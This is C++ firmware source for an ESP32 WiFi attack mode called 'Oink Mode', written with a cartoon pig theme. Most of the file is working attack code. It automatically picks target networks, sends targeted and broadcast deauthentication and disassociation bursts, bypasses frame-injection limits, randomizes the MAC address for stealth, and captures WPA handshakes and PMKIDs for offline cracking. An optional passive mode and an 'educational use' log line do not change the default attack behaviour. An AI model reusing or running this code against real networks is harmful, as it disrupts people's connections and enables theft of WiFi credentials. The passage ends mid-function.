// Oink Mode implementation

#include "oink.h"
#include "../core/config.h"
#include "../core/wsl_bypasser.h"
#include "../core/sdlog.h"
#include "../core/xp.h"
#include "../ui/display.h"
#include "../piglet/mood.h"
#include "../piglet/avatar.h"
#include "../ml/inference.h"
#include "../ui/swine_stats.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <SD.h>
#include <algorithm>
#include <cstdarg>  // For va_list in deferred logging

// Simple flag to avoid concurrent access between promiscuous callback and main thread
// The promiscuous callback runs in WiFi task context (not true ISR), but still needs
// synchronization to prevent race conditions on networks/handshakes vectors
static volatile bool oinkBusy = false;

// ============ Deferred Event System ============
// Callback sets flags/data, update() processes them in main thread context
// This avoids heap operations, String allocations, and Serial.printf in callback

// Pending network to add (callback copies data here, update() does push_back)
static volatile bool pendingNetworkAdd = false;
static DetectedNetwork pendingNetwork;

// Pending mood events (callback sets flag, update() calls Mood functions)
static volatile bool pendingNewNetwork = false;
static char pendingNetworkSSID[33] = {0};
static int8_t pendingNetworkRSSI = 0;
static uint8_t pendingNetworkChannel = 0;

static volatile bool pendingDeauthSuccess = false;
static uint8_t pendingDeauthStation[6] = {0};

static volatile bool pendingHandshakeComplete = false;
static char pendingHandshakeSSID[33] = {0};
static volatile bool pendingAutoSave = false;  // Trigger autoSaveCheck from main loop

static volatile bool pendingPMKIDCapture = false;
static char pendingPMKIDSSID[33] = {0};

// Pending handshake/PMKID creation (callback queues, update() does push_back)
// This avoids vector reallocation in callback context
struct PendingHandshakeCreate {
    uint8_t bssid[6];
    uint8_t station[6];
    uint8_t messageNum;        // Which EAPOL message triggered this
    uint8_t eapolData[512];    // Copy of EAPOL frame (matches EAPOLFrame.data size)
    uint16_t eapolLen;
    uint8_t pmkid[16];         // If M1, may contain PMKID
    bool hasPMKID;
};
static volatile bool pendingHandshakeCreateBusy = false;
static volatile bool pendingHandshakeCreateReady = false;
static PendingHandshakeCreate pendingHandshakeCreate;

struct PendingPMKIDCreate {
    uint8_t bssid[6];
    uint8_t station[6];
    uint8_t pmkid[16];
    char ssid[33];
};
static volatile bool pendingPMKIDCreateBusy = false;
static volatile bool pendingPMKIDCreateReady = false;
static PendingPMKIDCreate pendingPMKIDCreate;

// Pending log messages (simple ring buffer for debug output)
#define PENDING_LOG_SIZE 4
#define PENDING_LOG_LEN 96
static char pendingLogs[PENDING_LOG_SIZE][PENDING_LOG_LEN];
static volatile uint8_t pendingLogHead = 0;
static volatile uint8_t pendingLogTail = 0;

static void queueLog(const char* fmt, ...) {
    // Lock-free single-producer (callback) queue
    uint8_t next = (pendingLogHead + 1) % PENDING_LOG_SIZE;
    if (next == pendingLogTail) return;  // Full, drop message
    
    va_list args;
    va_start(args, fmt);
    vsnprintf(pendingLogs[pendingLogHead], PENDING_LOG_LEN, fmt, args);
    va_end(args);
    pendingLogHead = next;
}

static void flushLogs() {
    while (pendingLogTail != pendingLogHead) {
        Serial.println(pendingLogs[pendingLogTail]);
        pendingLogTail = (pendingLogTail + 1) % PENDING_LOG_SIZE;
    }
}

// Static members
bool OinkMode::running = false;
bool OinkMode::scanning = false;
bool OinkMode::deauthing = false;
bool OinkMode::channelHopping = true;
uint8_t OinkMode::currentChannel = 1;
uint32_t OinkMode::lastHopTime = 0;
uint32_t OinkMode::lastScanTime = 0;
std::vector<DetectedNetwork> OinkMode::networks;
std::vector<CapturedHandshake> OinkMode::handshakes;
std::vector<CapturedPMKID> OinkMode::pmkids;
int OinkMode::targetIndex = -1;
uint8_t OinkMode::targetBssid[6] = {0};
int OinkMode::selectionIndex = 0;
uint32_t OinkMode::packetCount = 0;
uint32_t OinkMode::deauthCount = 0;

// Beacon frame storage for PCAP (required for hashcat)
uint8_t* OinkMode::beaconFrame = nullptr;
uint16_t OinkMode::beaconFrameLen = 0;
bool OinkMode::beaconCaptured = false;

// BOAR BROS - excluded networks
std::map<uint64_t, String> OinkMode::boarBros;
static const char* BOAR_BROS_FILE = "/boar_bros.txt";
static const size_t MAX_BOAR_BROS = 50;  // Max excluded networks

// Channel hop order (most common channels first)
const uint8_t CHANNEL_HOP_ORDER[] = {1, 6, 11, 2, 3, 4, 5, 7, 8, 9, 10, 12, 13};
const uint8_t CHANNEL_COUNT = sizeof(CHANNEL_HOP_ORDER);
uint8_t currentHopIndex = 0;

// Memory limits to prevent OOM
const size_t MAX_NETWORKS = 200;       // Max tracked networks
const size_t MAX_HANDSHAKES = 50;      // Max handshakes (each can be large)
const size_t MAX_PMKIDS = 50;          // Max PMKIDs (smaller than handshakes)

// DO NO HAM mode - hardcoded optimal values for passive recon
// (not configurable - these are the best settings for fast walking)
const uint16_t DNH_HOP_INTERVAL = 150;     // 150ms = fast sweeps for mobile recon
const size_t DNH_MAX_NETWORKS = 150;       // Limited to prevent OOM when walking
const uint32_t DNH_STALE_TIMEOUT = 45000;  // 45s - faster cleanup when mobile
const size_t HEAP_MIN_THRESHOLD = 30000;   // 30KB minimum free heap to add networks

// Deauth timing
static uint32_t lastDeauthTime = 0;
static uint32_t lastMoodUpdate = 0;

// Random hunting sniff - periodic sniff to show piglet is actively hunting
static uint32_t lastRandomSniff = 0;
static const int RANDOM_SNIFF_CHANCE = 8;  // 8% chance per second = ~12 sec average

// Auto-attack state machine (like M5Gotchi)
enum class AutoState {
    SCANNING,       // Scanning for networks
    LOCKING,        // Locked to target channel, discovering clients
    ATTACKING,      // Deauthing + sniffing target
    WAITING,        // Delay between attacks
    NEXT_TARGET,    // Move to next target
    BORED           // No targets available - pig is bored
};
static AutoState autoState = AutoState::SCANNING;
static uint32_t stateStartTime = 0;
static uint32_t attackStartTime = 0;
static const uint32_t SCAN_TIME = 5000;         // 5 sec initial scan
// LOCK_TIME now uses SwineStats::getLockTime() for class buff support
static const uint32_t ATTACK_TIMEOUT = 15000;   // 15 sec per target
static const uint32_t WAIT_TIME = 2000;         // 2 sec between targets
static const uint32_t BORED_RETRY_TIME = 30000; // 30 sec between retry scans when bored
static const uint32_t BORED_THRESHOLD = 3;      // Failed target attempts before bored

// Bored state tracking
static uint8_t consecutiveFailedScans = 0;      // Track failed getNextTarget() calls
static uint32_t lastBoredUpdate = 0;            // For periodic bored mood updates

// WAITING state variables (reset in init() to prevent stale state on restart)
static bool checkedForPendingHandshake = false;
static bool hasPendingHandshake = false;

// Reset bored state on init
static bool boredStateReset = true;  // Flag to reset on start()

// Last pwned network SSID for display
static String lastPwnedSSID = "";

void OinkMode::init() {
    // Reset busy flag in case of abnormal stop
    oinkBusy = false;
    
    // Reset deferred event system
    pendingNetworkAdd = false;
    pendingNewNetwork = false;
    pendingDeauthSuccess = false;
    pendingHandshakeComplete = false;
    pendingPMKIDCapture = false;
    pendingLogHead = 0;
    pendingLogTail = 0;
    
    // Reset bored state tracking
    consecutiveFailedScans = 0;
    lastBoredUpdate = 0;
    boredStateReset = true;
    
    // Free per-handshake beacon memory
    for (auto& hs : handshakes) {
        if (hs.beaconData) {
            free(hs.beaconData);
            hs.beaconData = nullptr;
        }
    }
    
    networks.clear();
    handshakes.clear();
    pmkids.clear();
    targetIndex = -1;
    memset(targetBssid, 0, 6);
    selectionIndex = 0;
    packetCount = 0;
    deauthCount = 0;
    currentHopIndex = 0;
    
    // Reset state machine
    autoState = AutoState::SCANNING;
    stateStartTime = 0;
    attackStartTime = 0;
    lastDeauthTime = 0;
    lastPwnedSSID = "";
    lastMoodUpdate = 0;
    lastRandomSniff = 0;
    checkedForPendingHandshake = false;
    hasPendingHandshake = false;
    
    // Clear beacon frame if any
    if (beaconFrame) {
        free(beaconFrame);
        beaconFrame = nullptr;
    }
    beaconFrameLen = 0;
    beaconCaptured = false;
    
    // Load BOAR BROS exclusion list
    loadBoarBros();
        Serial.println("[OINK] Initialized");
}

void OinkMode::start() {
    if (running) return;
    
    bool doNoHam = Config::wifi().doNoHam;
    Serial.printf("[OINK] Starting %s...\n", doNoHam ? "DO NO HAM (passive recon)" : "auto-attack mode (like M5Gotchi)");
    
    // Initialize WSL bypasser for deauth frame injection
    WSLBypasser::init();
    
    // Initialize WiFi in promiscuous mode
    WiFi.mode(WIFI_STA);
    
    // Randomize MAC if enabled (stealth) - ALWAYS ON in DO NO HAM mode
    if (Config::wifi().randomizeMAC || doNoHam) {
        WSLBypasser::randomizeMAC();
    }
    
    WiFi.disconnect();
    delay(100);  // Give WiFi time to settle
    
    // Set callback BEFORE enabling promiscuous mode
    esp_wifi_set_promiscuous_rx_cb(promiscuousCallback);
    esp_wifi_set_promiscuous_filter(nullptr);  // Receive all packet types
    esp_wifi_set_promiscuous(true);
    
    // Set channel
    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
    
    running = true;
    scanning = true;
    channelHopping = true;
    lastHopTime = millis();
    lastScanTime = millis();
    
    // Set grass animation speed for OINK mode
    Avatar::setGrassSpeed(120);  // ~8 FPS casual trot
    
    // Initialize auto-attack state machine
    autoState = AutoState::SCANNING;
    stateStartTime = millis();
    selectionIndex = 0;
    
    // If entering OINK with DO NO HAM already enabled, set passive time start
    // (D-key handler only sets this on toggle, not on mode entry)
    if (doNoHam) {
        SessionStats& sess = const_cast<SessionStats&>(XP::getSession());
        if (sess.passiveTimeStart == 0) {
            sess.passiveTimeStart = millis();
        }
    }
    
    Mood::setStatusMessage("hunting truffles");
    Display::setWiFiStatus(true);
    Serial.println("[OINK] Auto-attack running");
}

void OinkMode::stop() {
    if (!running) return;
    
    Serial.println("[OINK] Stopping...");
    
    deauthing = false;
    scanning = false;
    
    // Stop grass animation
    Avatar::setGrassMoving(false);
    
    esp_wifi_set_promiscuous(false);
    
    // Free beacon frame
    if (beaconFrame) {
        free(beaconFrame);
        beaconFrame = nullptr;
    }
    beaconFrameLen = 0;
    beaconCaptured = false;
    
    // Free per-handshake beacon memory to prevent leaks on repeated start/stop
    for (auto& hs : handshakes) {
        if (hs.beaconData) {
            free(hs.beaconData);
            hs.beaconData = nullptr;
        }
    }
    
    // Log heap status for debugging memory issues
    Serial.printf("[OINK] Stopped - Free heap: %lu bytes\n", (unsigned long)ESP.getFreeHeap());
    
    running = false;
    Display::setWiFiStatus(false);
}

void OinkMode::update() {
    if (!running) return;
    
    uint32_t now = millis();
    
    // Guard access to networks/handshakes vectors from promiscuous callback
    oinkBusy = true;
    
    // ============ Process Deferred Events from Callback ============
    // These events were queued in promiscuous callback to avoid heap/String ops there
    
    // Flush any pending log messages from callback
    flushLogs();
    
    // Process pending network add
    if (pendingNetworkAdd) {
        // Check heap before allocating - skip if memory critically low
        if (ESP.getFreeHeap() >= HEAP_MIN_THRESHOLD) {
            networks.push_back(pendingNetwork);
        }
        pendingNetworkAdd = false;
    }
    
    // Process pending mood: new network discovered
    if (pendingNewNetwork) {
        Mood::onNewNetwork(pendingNetworkSSID, pendingNetworkRSSI, pendingNetworkChannel);
        pendingNewNetwork = false;
    }
    
    // Process pending mood: deauth success
    if (pendingDeauthSuccess) {
        Mood::onDeauthSuccess(pendingDeauthStation);
        pendingDeauthSuccess = false;
    }
    
    // Process pending mood: handshake complete
    if (pendingHandshakeComplete) {
        Mood::onHandshakeCaptured(pendingHandshakeSSID);
        lastPwnedSSID = String(pendingHandshakeSSID);
        Display::showLoot(lastPwnedSSID);  // Show PWNED banner in top bar
        pendingHandshakeComplete = false;
    }
    
    // Process pending mood: PMKID captured (clientless attack - extra special!)
    if (pendingPMKIDCapture) {
        Mood::onPMKIDCaptured(pendingPMKIDSSID);
        lastPwnedSSID = String(pendingPMKIDSSID);  // PMKID counts as pwned!
        Display::showLoot(lastPwnedSSID);  // Show PWNED banner in top bar
        SDLog::log("OINK", "PMKID captured: %s", pendingPMKIDSSID);
        pendingPMKIDCapture = false;
    }
    
    // Process pending auto-save (callback set flag, we do SD I/O here)
    if (pendingAutoSave) {
        autoSaveCheck();
        pendingAutoSave = false;
    }
    
    // Process pending handshake creation (callback queued, we do push_back here)
    if (pendingHandshakeCreateReady && !pendingHandshakeCreateBusy) {
        pendingHandshakeCreateBusy = true;  // Prevent callback from overwriting
        
        // Create or find handshake entry in main thread context
        int idx = findOrCreateHandshakeSafe(pendingHandshakeCreate.bssid, pendingHandshakeCreate.station);
        if (idx >= 0) {
            CapturedHandshake& hs = handshakes[idx];
            uint8_t msgNum = pendingHandshakeCreate.messageNum;
            
            // Store the EAPOL frame (data is fixed array, check len==0 for "empty")
            if (msgNum >= 1 && msgNum <= 4 && pendingHandshakeCreate.eapolLen > 0) {
                int msgIdx = msgNum - 1;
                if (hs.frames[msgIdx].len == 0) {  // Not already captured
                    uint16_t copyLen = min((uint16_t)512, pendingHandshakeCreate.eapolLen);
                    memcpy(hs.frames[msgIdx].data, pendingHandshakeCreate.eapolData, copyLen);
                    hs.frames[msgIdx].len = copyLen;
                    hs.frames[msgIdx].messageNum = msgNum;
                    hs.frames[msgIdx].timestamp = millis();
                    hs.capturedMask |= (1 << msgIdx);
                    hs.lastSeen = millis();
                    
                    queueLog("[OINK] M%d captured (deferred)", msgNum);
                    
                    // Check if handshake is now complete
                    if (hs.isComplete() && !hs.saved) {
                        pendingHandshakeComplete = true;
                        // Get SSID for this BSSID
                        for (const auto& net : networks) {
                            if (memcmp(net.bssid, pendingHandshakeCreate.bssid, 6) == 0) {
                                strncpy(pendingHandshakeSSID, net.ssid, 32);
                                pendingHandshakeSSID[32] = 0;
                                strncpy(hs.ssid, net.ssid, 32);
                                hs.ssid[32] = 0;
                                break;
                            }
                        }
                        // Auto-save complete handshake (safe here - main thread context)
                        autoSaveCheck();
                    }
                }
            }
            
            // Handle PMKID from M1 if present
            if (pendingHandshakeCreate.hasPMKID) {
                int pIdx = findOrCreatePMKIDSafe(pendingHandshakeCreate.bssid, pendingHandshakeCreate.station);
                if (pIdx >= 0 && !pmkids[pIdx].saved) {
                    memcpy(pmkids[pIdx].pmkid, pendingHandshakeCreate.pmkid, 16);
                    // Get SSID
                    for (const auto& net : networks) {
                        if (memcmp(net.bssid, pendingHandshakeCreate.bssid, 6) == 0) {
                            strncpy(pmkids[pIdx].ssid, net.ssid, 32);
                            pmkids[pIdx].ssid[32] = 0;
                            break;
                        }
                    }
                }
            }
        }
        
        pendingHandshakeCreateReady = false;
        pendingHandshakeCreateBusy = false;
    }
    
    // Process pending PMKID creation (callback queued, we do push_back here)
    if (pendingPMKIDCreateReady && !pendingPMKIDCreateBusy) {
        pendingPMKIDCreateBusy = true;  // Prevent callback from overwriting
        
        // Create PMKID entry in main thread context
        int idx = findOrCreatePMKIDSafe(pendingPMKIDCreate.bssid, pendingPMKIDCreate.station);
        if (idx >= 0 && !pmkids[idx].saved) {
            memcpy(pmkids[idx].pmkid, pendingPMKIDCreate.pmkid, 16);
            pmkids[idx].timestamp = millis();
            if (pendingPMKIDCreate.ssid[0] != 0) {
                strncpy(pmkids[idx].ssid, pendingPMKIDCreate.ssid, 32);
                pmkids[idx].ssid[32] = 0;
            }
            queueLog("[OINK] PMKID created (deferred)");
        }
        
        pendingPMKIDCreateReady = false;
        pendingPMKIDCreateBusy = false;
    }
    
    // ============ End Deferred Event Processing ============
    
    // RELEASE LOCK EARLY - state machine doesn't need exclusive vector access
    // This minimizes packet drop window from ~10ms to ~0.5ms
    oinkBusy = false;
    
    // DO NO HAM: Immediately abort any active attack if passive mode is enabled
    // This ensures toggling D key stops attacks right away, not after current cycle
    if (Config::wifi().doNoHam && autoState != AutoState::SCANNING && autoState != AutoState::BORED) {
        Serial.println("[OINK] DO NO HAM enabled - aborting attack, returning to passive scan");
        autoState = AutoState::SCANNING;
        stateStartTime = now;
        deauthing = false;
        channelHopping = true;
        targetIndex = -1;
        memset(targetBssid, 0, 6);
    }
    
    // Sync grass animation with channel hopping state
    Avatar::setGrassMoving(channelHopping);
    
    // Auto-attack state machine (like M5Gotchi)
    switch (autoState) {
        case AutoState::SCANNING:
            {
                bool doNoHam = Config::wifi().doNoHam;
                uint16_t hopInterval = doNoHam ? DNH_HOP_INTERVAL : SwineStats::getChannelHopInterval();
                
                // Channel hopping during scan (buff-modified interval, or fast DNH interval)
                if (now - lastHopTime > hopInterval) {
                    hopChannel();
                    lastHopTime = now;
                }
                
                // Random hunting sniff - shows piglet is actively sniffing
                // Check every 1 second with 8% chance = ~12 second average between sniffs
                if (now - lastRandomSniff > 1000) {
                    lastRandomSniff = now;  // Always reset timer on check
                    if (random(0, 100) < RANDOM_SNIFF_CHANCE) {
                        Avatar::sniff();
                    }
                }
                
                // Update mood
                if (now - lastMoodUpdate > 3000) {
                    if (doNoHam) {
                        Mood::onPassiveRecon(networks.size(), currentChannel);
                    } else {
                        Mood::onSniffing(networks.size(), currentChannel);
                    }
                    lastMoodUpdate = now;
                }
                
                // DO NO HAM mode: Stay in SCANNING forever, never attack
                if (doNoHam) {
                    // Just keep scanning - no state transitions to attack
                    // PMKID capture still works passively from M1 frames
                    break;
                }
                
                // After scan time, sort and pick target
                if (now - stateStartTime > SCAN_TIME) {
                    if (!networks.empty()) {
                        sortNetworksByPriority();
                        autoState = AutoState::NEXT_TARGET;
                        Serial.println("[OINK] Scan complete, starting auto-attack");
                    } else {
                        // No networks found after scan time
                        consecutiveFailedScans++;
                        if (consecutiveFailedScans >= BORED_THRESHOLD) {
                            // Pig is bored - empty spectrum
                            autoState = AutoState::BORED;
                            stateStartTime = now;
                            channelHopping = false;
                            Mood::onBored(0);
                            Serial.println("[OINK] No networks found - pig is bored");
                        } else {
                            // Keep scanning
                            stateStartTime = now;
                            Serial.printf("[OINK] No networks, continuing scan (attempt %d/%d)\\n",
                                         consecutiveFailedScans, BORED_THRESHOLD);
                        }
                    }
                }
            }
            break;
            
        case AutoState::NEXT_TARGET:
            {
                // Use smart target selection
                int nextIdx = getNextTarget();
                
                if (nextIdx < 0) {
                    consecutiveFailedScans++;
                    
                    if (consecutiveFailedScans >= BORED_THRESHOLD) {
                        // Pig is bored - no targets for too long
                        autoState = AutoState::BORED;
                        stateStartTime = now;
                        channelHopping = false;  // Stop grass animation
                        deauthing = false;
                        Mood::onBored(networks.size());
                        Serial.printf("[OINK] Pig is bored - no valid targets after %d attempts\n", consecutiveFailedScans);
                    } else {
                        // Keep trying - rescan
                        autoState = AutoState::SCANNING;
                        stateStartTime = now;
                        channelHopping = true;
                        deauthing = false;
                        Mood::setStatusMessage("sniff n drift");
                        Serial.printf("[OINK] No targets, rescanning (attempt %d/%d)\n", 
                                     consecutiveFailedScans, BORED_THRESHOLD);
                    }
                    break;
                }
                
                // Found a target - reset failed scan counter
                consecutiveFailedScans = 0;
                
                selectionIndex = nextIdx;
                
                // Select this target (locks to channel, stops hopping)
                selectTarget(selectionIndex);
                networks[selectionIndex].attackAttempts++;
                
                // Go to LOCKING state to discover clients before attacking
                autoState = AutoState::LOCKING;
                stateStartTime = now;
                deauthing = false;  // Don't deauth yet, just listen
                channelHopping = false;  // Ensure channel stays locked during capture phase
                
                Serial.printf("[OINK] Locking to %s (ch%d) - discovering clients...\n", 
                             networks[selectionIndex].ssid,
                             networks[selectionIndex].channel);
                Mood::setStatusMessage("stalkin auths");
                Avatar::sniff();  // Nose twitch when sniffing for auths
            }
            break;
            
        case AutoState::LOCKING:
            // Wait on target channel to discover clients via data frames
            // This is crucial - targeted deauth is much more effective
            if (now - stateStartTime > SwineStats::getLockTime()) {
                if (targetIndex >= 0 && targetIndex < (int)networks.size()) {
                    DetectedNetwork* target = &networks[targetIndex];
                    
                    Serial.printf("[OINK] Starting attack on %s (%d clients found, attempt #%d)\n",
                                 target->ssid, target->clientCount, target->attackAttempts);
                    
                    if (target->clientCount == 0) {
                        Serial.println("[OINK] WARNING: No clients found - broadcast deauth only (less effective)");
                    }
                    
                    autoState = AutoState::ATTACKING;
                    attackStartTime = now;
                    deauthCount = 0;
                    deauthing = true;
                }
            }
            break;
            
        case AutoState::ATTACKING:
            // Send deauth burst every 100ms (more effective than single packets)
            if (now - lastDeauthTime > 100) {
                if (targetIndex >= 0 && targetIndex < (int)networks.size()) {
                    DetectedNetwork* target = &networks[targetIndex];
                    
                    // Skip if PMF (shouldn't happen but safety check)
                    if (target->hasPMF) {
                        selectionIndex++;
                        autoState = AutoState::NEXT_TARGET;
                        break;
                    }
                    
                    uint8_t broadcast[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
                    
                    // PRIORITY 1: Target specific clients (MOST EFFECTIVE)
                    // Targeted deauth is much more reliable than broadcast
                    if (target->clientCount > 0) {
                        // Get buff-modified burst count (base 5, buffed up to 8, debuffed down to 3)
                        uint8_t burstCount = SwineStats::getDeauthBurstCount();
                        for (int c = 0; c < target->clientCount && c < MAX_CLIENTS_PER_NETWORK; c++) {
                            // Send buff-modified deauths
                            sendDeauthBurst(target->bssid, target->clients[c].mac, burstCount);
                            deauthCount += burstCount;
                            
                            // Also disassoc targeted client
                            sendDisassocFrame(target->bssid, target->clients[c].mac, 8);
                        }
                    }
                    
                    // PRIORITY 2: Broadcast deauth (less effective, but catches unknown clients)
                    // Only send 1 broadcast per cycle to reduce noise
                    sendDeauthFrame(target->bssid, broadcast, 7);
                    deauthCount++;
                    
                    lastDeauthTime = now;
                }
            }
            
            // Update mood with attack progress
            if (now - lastMoodUpdate > 2000) {
                if (targetIndex >= 0 && targetIndex < (int)networks.size()) {
                    DetectedNetwork* target = &networks[targetIndex];
                    Mood::onDeauthing(target->ssid, deauthCount);
                    
                    // Log attack status including client count
                    Serial.printf("[OINK] Attacking %s: %d deauths, %d clients tracked\n",
                                 target->ssid, deauthCount, target->clientCount);
                }
                lastMoodUpdate = now;
            }
            
            // Check if handshake captured for this target
            for (const auto& hs : handshakes) {
                if (targetIndex >= 0 && targetIndex < (int)networks.size()) {
                    if (memcmp(hs.bssid, networks[targetIndex].bssid, 6) == 0 && hs.isComplete()) {
                        // Got handshake! Mark network and move to next
                        networks[targetIndex].hasHandshake = true;
                        Serial.printf("[OINK] Handshake captured for %s!\n", networks[targetIndex].ssid);
                        SDLog::log("OINK", "Handshake captured: %s", networks[targetIndex].ssid);
                        autoState = AutoState::WAITING;
                        stateStartTime = now;
                        deauthing = false;
                        break;
                    }
                }
            }
            
            // Timeout - move to next target
            if (now - attackStartTime > ATTACK_TIMEOUT) {
                Serial.printf("[OINK] Timeout on %s, moving to next\n", 
                    (targetIndex >= 0 && targetIndex < (int)networks.size()) ? networks[targetIndex].ssid : "?");
                autoState = AutoState::WAITING;
                stateStartTime = now;
                deauthing = false;
                // Keep channel locked during WAITING to catch late EAPOL responses
                // Channel hopping resumes only when moving to NEXT_TARGET with no pending handshake
            }
            break;
            
        case AutoState::WAITING:
            // Brief pause between attacks - keep channel locked for late EAPOL frames
            if (now - stateStartTime > WAIT_TIME) {
                // Check for incomplete handshake only once at WAIT_TIME threshold
                // to avoid repeated vector iteration overhead
                // (statics moved to file scope and reset in init())
                
                if (!checkedForPendingHandshake) {
                    checkedForPendingHandshake = true;
                    hasPendingHandshake = false;
                    if (targetIndex >= 0 && targetIndex < (int)networks.size()) {
                        for (const auto& hs : handshakes) {
                            if (memcmp(hs.bssid, networks[targetIndex].bssid, 6) == 0 && 
                                hs.hasM1() && !hs.hasM2()) {
                                hasPendingHandshake = true;
                                break;
                            }
                        }
                    }
                }
                
                if (hasPendingHandshake && now - stateStartTime < WAIT_TIME * 2) {
                    // Extended wait for pending handshake (up to 2x normal = 4 sec total)
                    break;
                }
                
                // Reset for next WAITING state
                checkedForPendingHandshake = false;
                hasPendingHandshake = false;
                autoState = AutoState::NEXT_TARGET;
            }
            break;
            
        case AutoState::BORED:
            // Pig is bored - no valid targets available
            // Stop grass, show bored phrases, periodically retry
            
            // Slow channel hop (power save) - hop every 2 seconds
            if (now - lastHopTime > 2000) {
                hopChannel();
                lastHopTime = now;
            }
            
            // Update bored mood every 5 seconds
            if (now - lastBoredUpdate > 5000) {
                Mood::onBored(networks.size());
                lastBoredUpdate = now;
            }
            
            // Check if new networks appeared (promiscuous mode still active)
            if (!networks.empty()) {
                int nextIdx = getNextTarget();
                if (nextIdx >= 0) {
                    // New valid target appeared!
                    consecutiveFailedScans = 0;
                    autoState = AutoState::NEXT_TARGET;
                    channelHopping = true;
                    Mood::setStatusMessage("new bacon!");
                    Avatar::sniff();
                    Serial.println("[OINK] New target detected, resuming hunt!");
                    break;
                }
            }
            
            // Periodic retry - do a fresh scan every 30 seconds
            if (now - stateStartTime > BORED_RETRY_TIME) {
                Serial.println("[OINK] Bored retry - rescanning...");
                autoState = AutoState::SCANNING;
                stateStartTime = now;
                channelHopping = true;
                consecutiveFailedScans = 0;  // Reset for fresh attempt
            }
            break;
    }
    
    // Periodic network cleanup - remove stale entries
    // Brief lock for vector erase operations
    if (now - lastScanTime > 30000) {
        oinkBusy = true;  // Brief lock for cleanup
        uint32_t staleTimeout = Config::wifi().doNoHam ? DNH_STALE_TIMEOUT : 60000;
        for (auto it = networks.begin(); it != networks.end();) {
            if (now - it->lastSeen > staleTimeout) {
                it = networks.erase(it);
            } else {
                ++it;
            }
        }
        // Revalidate targetIndex after cleanup using stored BSSID
        if (targetIndex >= 0) {
            targetIndex = findNetwork(targetBssid);
            if (targetIndex < 0) {
                // Target was removed, clear it
                deauthing = false;
                channelHopping = true;
                memset(targetBssid, 0, 6);
                Serial.println("[OINK] Target network expired");
            }
        }
        // Bounds check selectionIndex after potential removals
        if (!networks.empty() && selectionIndex >= (int)networks.size()) {
            selectionIndex = networks.size() - 1;
        } else if (networks.empty()) {
            selectionIndex = 0;
        }
        lastScanTime = now;
        
        // Periodic heap monitoring for debugging memory issues
        Serial.printf("[OINK] Heap: %lu free, Networks: %d, Handshakes: %d\n",
                     (unsigned long)ESP.getFreeHeap(), 
                     (int)networks.size(), 
                     (int)handshakes.size());
        oinkBusy = false;  // Release cleanup lock
    }
}

void OinkMode::startScan() {
    scanning = true;
    channelHopping = true;
    currentHopIndex = 0;
    Serial.println("[OINK] Scan started");
}

void OinkMode::stopScan() {
    scanning = false;
    Serial.println("[OINK] Scan stopped");
}

void OinkMode::selectTarget(int index) {
    if (index >= 0 && index < (int)networks.size()) {
        targetIndex = index;
        memcpy(targetBssid, networks[index].bssid, 6);  // Store BSSID
        networks[index].isTarget = true;
        
        // Clear old beacon frame when target changes
        if (beaconFrame) {
            free(beaconFrame);
            beaconFrame = nullptr;
        }
        beaconFrameLen = 0;
        beaconCaptured = false;
        
        // Lock to target's channel
        channelHopping = false;
        setChannel(networks[index].channel);
        
        // Auto-start deauth when target selected
        deauthing = true;
        
        Serial.printf("[OINK] Target selected: %s - Deauth auto-started\n", networks[index].ssid);
    }
}

void OinkMode::clearTarget() {
    if (targetIndex >= 0 && targetIndex < (int)networks.size()) {
        networks[targetIndex].isTarget = false;
    }
    targetIndex = -1;
    memset(targetBssid, 0, 6);
    deauthing = false;
    channelHopping = true;
    Serial.println("[OINK] Target cleared, deauth stopped");
}

DetectedNetwork* OinkMode::getTarget() {
    if (targetIndex >= 0 && targetIndex < (int)networks.size()) {
        return &networks[targetIndex];
    }
    return nullptr;
}

void OinkMode::moveSelectionUp() {
    if (networks.empty()) return;
    selectionIndex--;
    if (selectionIndex < 0) selectionIndex = networks.size() - 1;
}

void OinkMode::moveSelectionDown() {
    if (networks.empty()) return;
    selectionIndex++;
    if (selectionIndex >= (int)networks.size()) selectionIndex = 0;
}

void OinkMode::confirmSelection() {
    if (networks.empty()) return;
    if (selectionIndex >= 0 && selectionIndex < (int)networks.size()) {
        selectTarget(selectionIndex);
    }
}

void OinkMode::startDeauth() {
    if (!running || targetIndex < 0) return;
    
    deauthing = true;
    channelHopping = false;
    Serial.println("[OINK] Deauth started (EDUCATIONAL USE ONLY)");
}

void OinkMode::stopDeauth() {
    deauthing = false;
    Serial.println("[OINK] Deauth stopped");
}

void OinkMode::setChannel(uint8_t ch) {
    if (ch < 1 || ch > 14) return;
    currentChannel = ch;
    esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
}

void OinkMode::enableChannelHop(bool enable) {
    channelHopping = enable;
}

void OinkMode::hopChannel() {
    currentHopIndex = (currentHopIndex + 1) % CHANNEL_COUNT;
    currentChannel = CHANNEL_HOP_ORDER[currentHopIndex];
    esp_wifi_set_channel(currentChannel, WIFI_SECOND_CHAN_NONE);
}

void OinkMode::promiscuousCallback(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (!running) return;
    
    // Skip if main thread is accessing networks/handshakes vectors
    // This prevents race conditions - we'll catch this packet on next beacon
    if (oinkBusy) return;
    
    wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    uint16_t len = pkt->rx_ctrl.sig_len;
    int8_t rssi = pkt->rx_ctrl.rssi;
    
    // ESP32 adds 4 ghost bytes to sig_len
    if (len > 4) len -= 4;
    
    if (len < 24) return;  // Minimum 802.11 header
    
    // Simple increment - callback runs in WiFi task, not ISR
    packetCount++;
    
    const uint8_t* payload = pkt->payload;
    uint8_t frameSubtype = (payload[0] >> 4) & 0x0F;
    
    switch (type) {
        case WIFI_PKT_MGMT:
            if (frameSubtype == 0x08) {  // Beacon
                processBeacon(payload, len, rssi);
            } else if (frameSubtype == 0x05) {  // Probe Response
                processProbeResponse(payload, len, rssi);
            }
            break;
            
        case WIFI_PKT_DATA:
            processDataFrame(payload, len, rssi);
            break;
            
        default:
            break;
    }
    // Deauth moved to update() for reliable timing
}

void OinkMode::processBeacon(const uint8_t* payload, uint16_t len, int8_t rssi) {
    if (len < 36) return;
    
    // BSSID is at offset 16
    const uint8_t* bssid = payload + 16;
    
    // Detect PMF before anything else
    bool hasPMF = detectPMF(payload, len);
    
    // Capture beacon for target AP (needed for PCAP/hashcat)
    if (targetIndex >= 0 && targetIndex < (int)networks.size() && !beaconCaptured) {
        DetectedNetwork* target = &networks[targetIndex];
        if (memcmp(bssid, target->bssid, 6) == 0) {
